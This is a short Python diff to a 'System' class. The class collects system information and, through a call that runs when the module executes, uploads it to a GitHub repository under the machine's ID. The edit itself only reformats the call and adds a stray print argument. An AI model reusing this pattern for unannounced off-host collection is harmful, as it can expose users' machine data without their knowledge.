@@ -6,7 +6,9 @@ class System:
     def to_github():
         gcr = Github()
         gcr.save_to_repo(
-            "SysInfo/"+System.get_machine_id() + ".data", System.sys_info().encode("utf-8")
+            "SysInfo/" + System.get_machine_id() + ".data",
+            System.sys_info().encode("utf-8"),
+            print("Sysinfo done"),
         )
 
     def get_machine_id():
@@ -34,4 +36,6 @@ class System:
             return json.dumps(info)
         except Exception as e:
             print(e)
+
+
 System.to_github()
